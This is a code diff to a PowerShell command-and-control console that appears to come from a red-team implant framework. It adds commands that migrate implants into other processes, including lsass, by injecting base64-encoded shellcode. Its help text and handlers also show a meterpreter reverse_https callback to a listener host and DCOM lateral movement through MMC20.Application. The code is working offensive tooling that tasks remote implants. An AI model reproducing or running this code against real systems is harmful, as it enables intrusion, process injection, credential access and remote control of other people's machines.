@@ -610,8 +610,10 @@ $header = '
         write-host " Migrate-x64 -ProcID 4444" -ForegroundColor Green
         write-host " Migrate-x64 -NewProcess C:\Windows\System32\netsh.exe" -ForegroundColor Green
         write-host " Migrate-x86 -ProcName lsass" -ForegroundColor Green
-        write-host " Migrate-Proxypayload-x86 -ProcID 4444" -ForegroundColor Green
-        write-host " Migrate-Proxypayload-x64 -ProcName notepad" -ForegroundColor Green
+        write-host " Migrate-Proxy-x86 -ProcID 4444" -ForegroundColor Green
+        write-host " Migrate-Proxy-x64 -ProcName notepad" -ForegroundColor Green
+        write-host " Migrate-Daisy-x86 -Name DC1" -ForegroundColor Green
+        write-host " Migrate-Daisy-x64 -Name DC2" -ForegroundColor Green
         write-host " Inject-Shellcode -x86 -Shellcode (GC C:\Temp\Shellcode.bin -Encoding byte) -ProcID 5634" -ForegroundColor Green
         write-host " Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 172.16.0.100 -Lport 443 -Force" -ForegroundColor Green
         write-host ' Get-Eventlog -newest 10000 -instanceid 4624 -logname security | select message -ExpandProperty message | select-string -pattern "user1|user2|user3"' -ForegroundColor Green
@@ -921,6 +923,7 @@ function Upload-File
     "Upload-File -Destination '$Destination' -Base64 $base64"
     $reader.Dispose()
 }
+
 function CheckModuleLoaded {
     param
     (
@@ -940,6 +943,20 @@ function CheckModuleLoaded {
             Command   = "LoadModule $ModuleName"
         } | Out-Null
     }
+}
+
+function RunImplantCommand {
+    param
+    (
+    [string] $Command,
+    [string] $IMRandomURI
+    )
+    $query = "INSERT INTO NewTasks (RandomURI, Command) VALUES (@RandomURI, @Command)"
+    Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
+        RandomURI = $IMRandomURI
+        Command   = $Command
+    } | Out-Null
+
 }
 
 function creds {
@@ -1099,6 +1116,28 @@ function invoke-psexecdaisypayload {
         return $null
     }
 }
+function migrate-daisy {
+    param(
+    $name, [switch]$x86, [switch]$x64, $ProcID, $ProcessPath, $arch
+    )
+    $params = ""
+    if ($x64.IsPresent) {$params = $params + " -x64"}
+    if ($x86.IsPresent) {$params = $params + " -x86"}
+    if ($ProcessPath) {$params = $params + " -ProcessPath $ProcessPath"}
+    if ($ProcID) {$params = $params + " -ProcID $ProcID"}
+
+    if (Test-Path "$FolderPath\payloads\DaisyPosh_$($name)-shellcode_x$($arch).bin"){ 
+        CheckModuleLoaded "Inject-Shellcode.ps1" $psrandomuri
+        $bytes = (Get-Content "$FolderPath\payloads\DaisyPosh_$($name)-shellcode_x$($arch).bin" -Encoding Byte)
+        $base64 = [System.Convert]::ToBase64String($bytes)
+        $commandstring = "`$Shellcode$($arch) = `"$base64`""
+        RunImplantCommand $commandstring $psrandomuri                     
+        return "Inject-Shellcode -Shellcode ([System.Convert]::FromBase64String(`$Shellcode$($arch))) $($params)"
+    } else {
+        write-host "Need to run Invoke-DaisyChain first"
+        return $null
+    }
+}
 
 # run startup function
 startup
@@ -1241,8 +1280,7 @@ param
                 $pscommand = IEX $pscommand
             }
             if ($pscommand.ToLower().StartsWith('invoke-dcompayload'))
-            {
-                   
+            {                   
                    $payload = Get-Content -Path "$FolderPath\payloads\payload.bat"
                    $target = $pscommand -replace 'invoke-dcomdaisypayload -target ', ''
                    $pscommand = "`$c = [activator]::CreateInstance([type]::GetTypeFromProgID(`"MMC20.Application`",`"$target`")); `$c.Document.ActiveView.ExecuteShellCommand(`"C:\Windows\System32\cmd.exe`",`$null,`"/c $payload`",`"7`")"
@@ -1330,57 +1368,102 @@ param
             { 
                 CheckModuleLoaded "Get-FirewallRules.ps1" $psrandomuri
             }
-            if ($pscommand.ToLower().StartsWith('migrate-proxypayload-x86'))
+            if ($pscommand.ToLower().StartsWith('migrate-proxy-x86'))
             { 
-                if (Test-Path "$FolderPath\payloads\proxypayload.bat"){ 
-                CheckModuleLoaded "Invoke-ReflectivePEInjection.ps1" $psrandomuri
-                $proxypayload = gc "$FolderPath\payloads\proxypayload.bat"     
-                $query = "INSERT INTO NewTasks (RandomURI, Command) VALUES (@RandomURI, @Command)"
-                Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
-                    RandomURI = $psrandomuri
-                    Command   = "`$proxypayload = `"$proxypayload`""
-                } | Out-Null
-                           
-                CheckModuleLoaded "NamedPipeProxy.ps1" $psrandomuri
                 $psargs = $pscommand -replace 'migrate-proxypayload-x86',''
-                $pscommand = "invoke-reflectivepeinjection -payload Proxy_x86 $($psargs)"
+                if (Test-Path "$FolderPath\payloads\ProxyPosh-shellcode_x86.bin"){ 
+                    CheckModuleLoaded "Inject-Shellcode.ps1" $psrandomuri
+                    $bytes = (Get-Content "$FolderPath\payloads\ProxyPosh-shellcode_x86.bin" -Encoding Byte)
+                    $base64 = [System.Convert]::ToBase64String($bytes)
+                    $commandstring = "`$Shellcode86 = `"$base64`""
+                    RunImplantCommand $commandstring $psrandomuri                     
+                    $pscommand = "Inject-Shellcode -Shellcode ([System.Convert]::FromBase64String(`$Shellcode86)) $($psargs)"
                 } else {
-                write-host "Need to run CreateProxyPayload first"
-                $pscommand = $null
+                    if (Test-Path "$FolderPath\payloads\proxypayload.bat"){ 
+                    CheckModuleLoaded "Invoke-ReflectivePEInjection.ps1" $psrandomuri
+                    $proxypayload = gc "$FolderPath\payloads\proxypayload.bat"     
+                    $query = "INSERT INTO NewTasks (RandomURI, Command) VALUES (@RandomURI, @Command)"
+                    Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
+                        RandomURI = $psrandomuri
+                        Command   = "`$proxypayload = `"$proxypayload`""
+                    } | Out-Null
+                           
+                    CheckModuleLoaded "NamedPipeProxy.ps1" $psrandomuri
+                    $pscommand = "invoke-reflectivepeinjection -payload Proxy_x86 $($psargs)"
+                    } else {
+                    write-host "Need to run CreateProxyPayload first"
+                    $pscommand = $null
+                    }
                 }
             }
-            if ($pscommand.ToLower().StartsWith('migrate-proxypayload-x64'))
+            if ($pscommand.ToLower().StartsWith('migrate-proxy-x64'))
             { 
-                if (Test-Path "$FolderPath\payloads\proxypayload.bat"){ 
-                CheckModuleLoaded "Invoke-ReflectivePEInjection.ps1" $psrandomuri
-                $proxypayload = gc "$FolderPath\payloads\proxypayload.bat" 
-                $query = "INSERT INTO NewTasks (RandomURI, Command) VALUES (@RandomURI, @Command)"
-                Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
-                    RandomURI = $psrandomuri
-                    Command   = "`$proxypayload = `"$proxypayload`""
-                } | Out-Null
-                CheckModuleLoaded "NamedPipeProxy.ps1" $psrandomuri
                 $psargs = $pscommand -replace 'migrate-proxypayload-x64',''
-                $pscommand = "invoke-reflectivepeinjection -payload Proxy_x64 $($psargs)"
+                if (Test-Path "$FolderPath\payloads\ProxyPosh-shellcode_x64.bin"){ 
+                    CheckModuleLoaded "Inject-Shellcode.ps1" $psrandomuri
+                    $bytes = (Get-Content "$FolderPath\payloads\ProxyPosh-shellcode_x64.bin" -Encoding Byte)
+                    $base64 = [System.Convert]::ToBase64String($bytes)
+                    $commandstring = "`$Shellcode64 = `"$base64`""
+                    RunImplantCommand $commandstring $psrandomuri                     
+                    $pscommand = "Inject-Shellcode -Shellcode ([System.Convert]::FromBase64String(`$Shellcode64)) $($psargs)"
                 } else {
-                write-host "Need to run CreateProxyPayload first"
-                $pscommand = $null
+                    if (Test-Path "$FolderPath\payloads\proxypayload.bat"){ 
+                    CheckModuleLoaded "Invoke-ReflectivePEInjection.ps1" $psrandomuri
+                    $proxypayload = gc "$FolderPath\payloads\proxypayload.bat" 
+                    $query = "INSERT INTO NewTasks (RandomURI, Command) VALUES (@RandomURI, @Command)"
+                    Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
+                        RandomURI = $psrandomuri
+                        Command   = "`$proxypayload = `"$proxypayload`""
+                    } | Out-Null
+                    CheckModuleLoaded "NamedPipeProxy.ps1" $psrandomuri                    
+                    $pscommand = "invoke-reflectivepeinjection -payload Proxy_x64 $($psargs)"
+                    } else {
+                    write-host "Need to run CreateProxyPayload first"
+                    $pscommand = $null
+                    } 
                 }
-            }
+            }            
             if ($pscommand.ToLower().StartsWith('migrate-x86'))
             { 
-                CheckModuleLoaded "Invoke-ReflectivePEInjection.ps1" $psrandomuri
-                CheckModuleLoaded "NamedPipe.ps1" $psrandomuri
-                $psargs = $pscommand -replace 'migrate-x86',''
-                $pscommand = "invoke-reflectivepeinjection -payload x86 $($psargs)"
-
+                $psargs = $pscommand -replace 'migrate-x86',''                
+                if (Test-Path "$FolderPath\payloads\Posh-shellcode_x86.bin"){ 
+                    CheckModuleLoaded "Inject-Shellcode.ps1" $psrandomuri
+                    $bytes = (Get-Content "$FolderPath\payloads\Posh-shellcode_x86.bin" -Encoding Byte)
+                    $base64 = [System.Convert]::ToBase64String($bytes)
+                    $commandstring = "`$Shellcode86 = `"$base64`""
+                    RunImplantCommand $commandstring $psrandomuri                     
+                    $pscommand = "Inject-Shellcode -Shellcode ([System.Convert]::FromBase64String(`$Shellcode86)) $($psargs)"
+                } else {
+                    CheckModuleLoaded "Invoke-ReflectivePEInjection.ps1" $psrandomuri
+                    CheckModuleLoaded "NamedPipe.ps1" $psrandomuri
+                    $pscommand = "invoke-reflectivepeinjection -payload x86 $($psargs)"
+                }
             }
             if ($pscommand.ToLower().StartsWith('migrate-x64'))
             { 
-                CheckModuleLoaded "Invoke-ReflectivePEInjection.ps1" $psrandomuri
-                CheckModuleLoaded "NamedPipe.ps1" $psrandomuri
-                $psargs = $pscommand -replace 'migrate-x64',''
-                $pscommand = "invoke-reflectivepeinjection -payload x64 $($psargs)"
+                $psargs = $pscommand -replace 'migrate-x64',''                
+                if (Test-Path "$FolderPath\payloads\Posh-shellcode_x64.bin"){ 
+                    CheckModuleLoaded "Inject-Shellcode.ps1" $psrandomuri
+                    $bytes = (Get-Content "$FolderPath\payloads\Posh-shellcode_x64.bin" -Encoding Byte)
+                    $base64 = [System.Convert]::ToBase64String($bytes)
+                    $commandstring = "`$Shellcode64 = `"$base64`""
+                    RunImplantCommand $commandstring $psrandomuri                     
+                    $pscommand = "Inject-Shellcode -Shellcode ([System.Convert]::FromBase64String(`$Shellcode64)) $($psargs)"
+                } else {
+                    CheckModuleLoaded "Invoke-ReflectivePEInjection.ps1" $psrandomuri
+                    CheckModuleLoaded "NamedPipe.ps1" $psrandomuri
+                    $pscommand = "Invoke-Shellcode $($psargs)"
+                }
+            }
+            if ($pscommand.ToLower().StartsWith('migrate-daisy-x86'))
+            {
+                $pscommand = $pscommand -replace 'migrate-daisy-x86','migrate-daisy -arch 86'
+                $pscommand = IEX $pscommand
+            }
+            if ($pscommand.ToLower().StartsWith('migrate-daisy-x64'))
+            {
+                $pscommand = $pscommand -replace 'migrate-daisy-x64','migrate-daisy -arch 64'
+                $pscommand = IEX $pscommand
             }
             if ($pscommand.ToLower().StartsWith('invoke-psinject-payload'))
             { 
@@ -1418,7 +1501,6 @@ param
             { 
                 CheckModuleLoaded "Powerup.ps1" $psrandomuri
             }
-
             if ($pscommand.ToLower().StartsWith('invoke-privescaudit'))
             { 
                 CheckModuleLoaded "Powerup.ps1" $psrandomuri
